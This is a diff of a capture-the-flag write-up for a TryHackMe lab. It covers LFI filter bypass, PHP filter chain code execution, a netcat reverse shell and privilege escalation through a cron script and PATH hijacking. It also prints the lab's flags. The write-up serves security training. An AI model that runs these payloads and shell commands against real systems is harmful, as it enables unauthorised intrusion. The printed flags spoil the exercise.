@@ -1,24 +1,20 @@
 # 😇 Archangel
 
-### TryHackMe Writeup
-
 [![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/archangel)
 [![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com/room/archangel)
-[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com/room/archangel)
-[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com/room/archangel)
+[![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)](https://tryhackme.com/room/archangel)
+[![Type](https://img.shields.io/badge/Type-Boot2Root-blue?style=for-the-badge)](https://tryhackme.com/room/archangel)
 
 ---
 
-## 📋 Overview
-
-| Field | Details |
+| | |
 |---|---|
-| **Target** | `10.48.129.113` |
-| **OS** | Ubuntu (kernel 4.15.0-123-generic x86_64) |
+| **Target** | `10.48.139.244` |
+| **OS** | Linux |
 | **Attack Surface** | HTTP vhost enumeration, LFI, PHP filter chain RCE |
-| **Privesc** | www-data → archangel (out of scope) |
+| **Privesc** | cron (www-data → archangel), PATH hijacking SUID binary (archangel → root) |
 
-Archangel starts with a single open web port. A contact email in the homepage source leaks a hidden virtual hostname that hosts a PHP page with a Local File Inclusion vulnerability. The LFI is protected by a filter, but reading the PHP source reveals the exact rules — and the rules are easy to bypass. Log poisoning is not possible here, so RCE is achieved via a PHP filter chain with a small trick to pass the path check without breaking the chain.
+Archangel has one open web port. A contact email in the homepage reveals a hidden virtual hostname. That host runs a PHP page with an LFI bug — reading the source exposes the exact filter rules, and a one-character swap bypasses them. RCE comes from a PHP filter chain; a world-writable cron script hands over a lateral shell, and a SUID binary that calls `cp` without a full path gives root.
 
 ---
 
@@ -26,25 +22,31 @@ Archangel starts with a single open web port. A contact email in the homepage so
 
 ### Port Scan
 
+Scan all TCP ports and the top 200 UDP ports.
+
 ```bash
-sudo nmap -sS -vv -p- -oA nmap/tcp_syn 10.48.129.113
-sudo nmap -sU -vv --top-ports 200 -oA nmap/udp_top 10.48.129.113
+sudo nmap -sS -vv -p- -oA nmap/tcp_syn 10.48.139.244
+sudo nmap -sU -vv --top-ports 200 -oA nmap/udp_top 10.48.139.244
 ```
 
-```
+```text
 22/tcp  open  SSH
 80/tcp  open  HTTP — Apache/2.4.29 (Ubuntu)
 68/udp  open|filtered  dhcpc  (noise — ignore)
 ```
 
-### Directory Bruteforce — archangel
+SSH and HTTP are the only attack surface.
+
+### Directory Scan — archangel
+
+Scan for directories and files on the main vhost.
 
 ```bash
 ffuf -u http://archangel/FUZZ -w ./Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
   -v -ic -c -t 50 -e .php,.html,.txt -o nmap/ffuf_archangel.json
 ```
 
-```
+```text
 /                → 200
 /images/         → 301
 /pages/          → 301  (static HTML templates only)
@@ -54,57 +56,65 @@ ffuf -u http://archangel/FUZZ -w ./Web-Content/DirBuster-2007_directory-list-2.3
 /server-status   → 403
 ```
 
+Nothing useful on the main site.
+
 ### Vhost Discovery
 
-The homepage contact section contained an email address that revealed a second virtual hostname:
+Check the homepage source for email addresses — they often reveal internal hostnames.
 
 ```bash
 curl -s http://archangel/ | grep -i mail
 # → support@mafialive.thm
 ```
 
+Add the hostname and grab the page.
+
 ```bash
-echo "10.48.129.113 mafialive.thm" | sudo tee -a /etc/hosts
+echo "10.48.139.244 mafialive.thm" | sudo tee -a /etc/hosts
 curl -s http://mafialive.thm/
 ```
 
-First flag in the response. Added to `/etc/hosts` and moved on.
+The response contains Flag 1.
 
-### Directory Bruteforce — mafialive.thm
+### Directory Scan — mafialive.thm
+
+Scan the new vhost for directories and files.
 
 ```bash
 ffuf -u http://mafialive.thm/FUZZ -w ./Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
   -v -ic -c -t 50 -e .php,.html,.txt -o nmap/ffuf_mafia.json
 ```
 
-```
+```text
 /robots.txt  → 200  (Disallow: /test.php)
-/test.php    → 200  ← LFI endpoint
+/test.php    → 200
 ```
+
+`robots.txt` points straight at the interesting endpoint.
 
 ---
 
-## 💀 Initial Access — LFI → PHP Filter Chain RCE
+## 💀 Initial Access
 
 ### LFI Discovery
 
-`/test.php` had a `?view=` parameter and a button that pre-loaded a local PHP file — a clear sign of file inclusion:
+`/test.php` has a `?view=` parameter and a button that loads a local PHP file. This is LFI (Local File Inclusion) — the app includes a file you name in the URL.
 
-```
+```text
 http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
 → "Control is an illusion"
 ```
 
 ### Reading the Filter Logic
 
-Rather than guessing the filter rules, `php://filter` was used to read the raw PHP source of `test.php` as base64 — the file is returned encoded so PHP does not execute it:
+Read the `test.php` source before trying any bypass. `php://filter` with base64 encoding returns the file as base64 — PHP never executes it.
 
 ```bash
 curl -s "http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php" \
   | grep -oP '[A-Za-z0-9+/=]{50,}' | head -1 | base64 -d
 ```
 
-The source contained a hidden comment with the second flag, and revealed the filter logic:
+The source has a hidden comment with Flag 2. It also shows the filter:
 
 ```php
 function containsStr($str, $substr) {
@@ -119,47 +129,36 @@ if(isset($_GET["view"])){
 }
 ```
 
-**Filter rules:**
-- Blocks: path containing `../..`
-- Requires: path containing `/var/www/html/development_testing`
+The filter blocks `../..` and requires `/var/www/html/development_testing` in the path.
 
-### LFI Path Traversal Bypass
+### Path Traversal Bypass
 
-The filter blocks `../..` as a substring but not `.././`. Swapping every `../` with `.././` gets around it — the path still traverses up directories but never contains the blocked string:
+The filter blocks `../..` as a string but not `.././`. Replace every `../` with `.././` — the path still climbs directories but the banned string never appears.
 
 ```bash
-# Reads /etc/passwd
 curl -s "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../etc/passwd"
 ```
 
-```
+```text
 root:x:0:0:root:/root:/bin/bash
 ...
 archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
 ```
 
-### Log Poisoning Attempt (failed)
+### Log Poisoning (failed)
 
 ```bash
 curl -s -A '<?php system($_GET["cmd"]); ?>' http://mafialive.thm/
 curl -v "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log&cmd=id"
 ```
 
-Log poisoning was not possible here.
+The access log is not readable through the LFI. Move to a different approach.
 
 ### PHP Filter Chain RCE
 
-Used the [Synacktiv PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) to generate `<?php system($_GET["cmd"]); ?>` purely from iconv encoding tricks — no writable file needed.
+Use the [Synacktiv PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) to build `<?php system($_GET["cmd"]); ?>` from iconv encoding tricks. No file write needed — the LFI alone is enough.
 
-**The path check bypass:**
-
-The generator outputs a chain ending in `resource=php://temp`. The problem: `php://temp` does not contain `/var/www/html/development_testing`, so the filter rejects it. The fix is to append the required string as a query parameter on the stream URL:
-
-```
-resource=php://temp?/var/www/html/development_testing
-```
-
-PHP ignores query strings on internal `php://` streams, so the chain still gets its empty input and generates the right PHP code. But `strpos()` sees the required path in the string and lets it through.
+The generator outputs a chain ending in `resource=php://temp`. The filter rejects this because `php://temp` does not contain `/var/www/html/development_testing`. Append it as a query string. PHP ignores query strings on `php://` streams, but `strpos()` sees the string and passes the check.
 
 ```bash
 python3 ./php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' 2>/dev/null \
@@ -168,11 +167,10 @@ python3 ./php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
   > /tmp/chain.txt
 ```
 
-Wrapper script to make it easy to run commands:
+This wrapper script URL-encodes the chain and runs commands:
 
 ```bash
 #!/bin/bash
-# rce.sh — usage: ./rce.sh "command"
 CHAIN=$(python3 ./php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' 2>/dev/null \
   | tail -1 \
   | sed 's|resource=php://temp|resource=php://temp?/var/www/html/development_testing|')
@@ -184,6 +182,8 @@ curl -s "http://mafialive.thm/test.php?view=${ENCODED}&cmd=${CMD}" \
   | grep -v "INCLUDE\|Test Page\|button\|Here is\|DOCTYPE\|html\|head\|body\|title\|href"
 ```
 
+Confirm RCE:
+
 ```bash
 ./rce.sh id
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -191,20 +191,22 @@ curl -s "http://mafialive.thm/test.php?view=${ENCODED}&cmd=${CMD}" \
 
 ### Reverse Shell
 
-```bash
-# Listener
-nc -nlvp 4444 -s 192.168.240.231
+Start a listener, then trigger the shell.
 
-# Trigger
+```bash
+nc -nlvp 4444 -s 192.168.240.231
+```
+
+```bash
 ./rce.sh "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.240.231 4444 >/tmp/f"
 ```
 
-```
-connect to [192.168.240.231] from (UNKNOWN) [10.48.129.113] 42158
+```text
+connect to [192.168.240.231] from (UNKNOWN) [10.48.139.244] 42158
 www-data@ubuntu:/var/www/html/development_testing$
 ```
 
-### User Flag
+Read the user flag.
 
 ```bash
 cat /home/archangel/user.txt
@@ -214,7 +216,106 @@ cat /home/archangel/user.txt
 
 ## 🔁 Privilege Escalation
 
-This box was used to build and test the multi-agent CTF workflow. Privilege escalation was not attempted — the engagement stopped at the `www-data` shell after capturing the user flag.
+### www-data → archangel (Cron + World-Writable Script)
+
+Check for files any user can write to.
+
+```bash
+find / -type f -writable 2>/dev/null | grep -v proc | grep -v sys | xargs ls -lah
+```
+
+```text
+-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh
+```
+
+`/opt/helloworld.sh` is world-writable and owned by `archangel`. A cron job runs it as `archangel`. Overwrite it to copy `bash` and set the SUID bit.
+
+```bash
+cat > /opt/helloworld.sh << 'EOF'
+#!/bin/bash
+cp /bin/bash /home/archangel/bash
+chmod +s /home/archangel/bash
+echo "hello world" >> /opt/backupfiles/helloworld.txt
+EOF
+```
+
+Watch for the SUID copy to appear.
+
+```bash
+watch -n 1 ls -lah /home/archangel
+```
+
+Once `-rwsr-sr-x ... bash` shows up, run it with `-p` to keep the effective UID.
+
+```bash
+/home/archangel/bash -p
+# uid=33(www-data) gid=33(www-data) euid=1001(archangel) egid=1001(archangel)
+```
+
+Read Flag 4 from the `secret` directory.
+
+```bash
+cat /home/archangel/secret/user2.txt
+```
+
+### Stable Shell via SSH
+
+Generate a key pair and place the public key in `archangel`'s `authorized_keys`.
+
+```bash
+ssh-keygen -t ed25519 -f ./private.key
+mkdir -p /home/archangel/.ssh
+cat ./private.key.pub >> /home/archangel/.ssh/authorized_keys
+```
+
+SSH in for a proper TTY.
+
+```bash
+chmod 600 private.key
+ssh -i ./private.key archangel@archangel
+```
+
+### archangel → root (PATH Hijacking — SUID Binary)
+
+`/home/archangel/secret/backup` is SUID root. Run `strace` to see what it calls internally.
+
+```bash
+strace ./backup 2>&1
+```
+
+The binary forks a child that runs `cp` without a full path:
+
+```text
+cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
+```
+
+`cp` resolves through `PATH`. Add `.` to the front of `PATH` and drop a malicious `cp` in the current directory.
+
+```bash
+echo -e '#!/bin/bash\nchmod +s /bin/bash 2>/dev/null' > cp
+chmod +x cp
+PATH=.:$PATH ./backup
+```
+
+The SUID binary calls `./cp` as root. Check that `/bin/bash` now has the SUID bit.
+
+```bash
+ls -lah /bin/bash
+# -rwsr-sr-x 1 root root 1.1M Jun  7  2019 /bin/bash
+```
+
+Run `bash -p` to get a root shell.
+
+```bash
+/bin/bash -p
+# uid=1001(archangel) gid=1001(archangel) euid=0(root) egid=0(root)
+```
+
+Read the root flag.
+
+```bash
+cat /root/root.txt
+```
 
 ---
 
@@ -225,7 +326,7 @@ This box was used to build and test the multi-agent CTF workflow. Privilege esca
     |
     | homepage source → support@mafialive.thm
     v
-[mafialive.thm vhost]              → Flag 1
+[mafialive.thm vhost]                   → Flag 1
     |
     | robots.txt → /test.php
     v
@@ -233,7 +334,7 @@ This box was used to build and test the multi-agent CTF workflow. Privilege esca
     |
     | php://filter base64 → test.php source
     v
-[Filter Logic Reversed]             → Flag 2
+[Filter Logic Reversed]                  → Flag 2
     |  blocks: ../..
     |  requires: /var/www/html/development_testing
     |
@@ -243,20 +344,36 @@ This box was used to build and test the multi-agent CTF workflow. Privilege esca
     v
 [www-data shell]
     |
-    | /home/archangel/user.txt
+    | /home/archangel/user.txt           → Flag 3
+    |
+    | /opt/helloworld.sh (world-writable, cron runs as archangel)
+    | inject: cp /bin/bash + chmod +s → wait for cron
     v
-                                    → Flag 3 (user.txt)
+[archangel shell — euid=1001]
+    |
+    | /home/archangel/secret/user2.txt  → Flag 4
+    |
+    | backup (SUID root) calls cp without full path
+    | PATH=.:$PATH + malicious cp → chmod +s /bin/bash
+    v
+[root — euid=0]
+    |
+    | /root/root.txt                     → Flag 5
+    v
+[Pwned]
 ```
 
 ---
 
 ## 📌 Key Takeaways
 
-- Always grep page source for email addresses — they can reveal virtual hostnames that aren't linked anywhere
-- `strpos()` string filters are easy to bypass when you know the exact rule: blocking `../..` while allowing `.././` leaves a wide open path
-- Use `php://filter/convert.base64-encode` to read PHP source code safely without executing it — always do this before trying blind LFI exploitation
-- PHP filter chain RCE works with no log file and no upload — just a working LFI and the generator script
-- If a path check requires a specific string in the `view` parameter, appending it as a query string on `php://temp` satisfies the check without affecting the chain
+- Always check page source for email addresses — they reveal vhosts not linked anywhere else
+- Read PHP source with `php://filter/convert.base64-encode` before guessing any bypass — the filter rules are right there
+- `strpos()` blocking `../..` is not the same as blocking path traversal — `.././` still climbs directories
+- PHP filter chain RCE needs only a working LFI — no file upload, no log write needed
+- Append the required string as a query on `php://temp` to pass a `strpos()` check without breaking the chain
+- World-writable scripts owned by another user and run by cron are instant lateral movement — always check `/opt/` and `/etc/cron*`
+- SUID binaries that call commands without full paths are vulnerable to PATH hijacking — prepend a writable directory to `PATH` and plant the command there
 
 ---
 
@@ -267,22 +384,26 @@ This box was used to build and test the multi-agent CTF workflow. Privilege esca
 | Reconnaissance | Active Scanning: Wordlist Scanning | [T1595.003](https://attack.mitre.org/techniques/T1595/003) |
 | Discovery | Network Service Discovery | [T1046](https://attack.mitre.org/techniques/T1046) |
 | Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
-| Credential Access | Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001) |
 | Execution | Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004) |
 | Defense Evasion | Obfuscated Files or Information | [T1027](https://attack.mitre.org/techniques/T1027) |
+| Privilege Escalation | Scheduled Task/Job: Cron | [T1053.003](https://attack.mitre.org/techniques/T1053/003) |
+| Privilege Escalation | Hijack Execution Flow: Path Interception by PATH Environment Variable | [T1574.007](https://attack.mitre.org/techniques/T1574/007) |
+| Privilege Escalation | Abuse Elevation Control Mechanism: Setuid and Setgid | [T1548.001](https://attack.mitre.org/techniques/T1548/001) |
 
 ---
 
 ## 🛠️ Tools Used
 
 | Tool | Purpose |
-|---|---|
+| --- | --- |
 | `nmap` | TCP SYN + UDP port scan |
-| `ffuf` | Directory and file bruteforce on both vhosts |
+| `ffuf` | Directory and file scan on both vhosts |
 | `curl` | Manual LFI probing, source exfiltration, RCE delivery |
 | `php_filter_chain_generator.py` | Generate PHP filter chain RCE payload |
-| `rce.sh` | Custom wrapper — URL-encodes chain and delivers commands |
+| `rce.sh` | Custom wrapper — URL-encodes chain and runs commands |
 | `nc` | Reverse shell listener |
+| `ssh-keygen` | Generate ed25519 key pair for stable archangel shell |
+| `strace` | Confirm backup binary calls cp without full path |
 
 ---
 
@@ -309,3 +430,16 @@ This box was used to build and test the multi-agent CTF workflow. Privilege esca
 
 </details>
 
+<details>
+<summary><code>user2.txt</code></summary>
+
+`thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}`
+
+</details>
+
+<details>
+<summary><code>root.txt</code></summary>
+
+`thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}`
+
+</details>
